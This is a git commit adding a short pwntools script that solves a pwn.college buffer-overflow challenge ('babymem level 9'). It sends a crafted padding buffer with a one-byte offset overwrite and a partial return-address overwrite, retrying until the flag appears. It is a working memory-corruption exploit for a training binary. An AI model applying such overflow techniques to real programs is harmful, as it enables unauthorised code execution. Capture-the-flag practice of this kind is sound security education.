d7f3bea8cd5aa8a4d4cfe60860c99b89da4a1c02
Ernesto Pastori <43282001+ernepasto@users.noreply.github.com>
2025-04-11 20:49:20 +0200

    Update babymem-level-9-1.py

--- challenges/bof/babymem-level-9-1.py
+++ challenges/bof/babymem-level-9-1.py
@@ -1,1 +1,29 @@
+#!/usr/bin/python3
+from pwn import *
 
+'''
+-- OBIETTIVO DEL PROGRAMMA --
+
+-----------------------------
+'''
+
+# context.log_level = 'CRITICAL'
+
+elf = ELF('/challenge/babymem-level-9-0')
+
+win_addr = p16(0x1996) # p16(0x1481)
+delta_len = 116 # 72
+padding = b'A' * delta_len
+bytestream = padding + p8(136 - 1) + win_addr
+
+while True:
+
+    p = elf.process()
+
+    p.sendline(b'138')
+    p.sendline(bytestream)
+    output = p.recvall().decode()
+
+    if 'pwn.college' in output:
+        print(output)
+        break
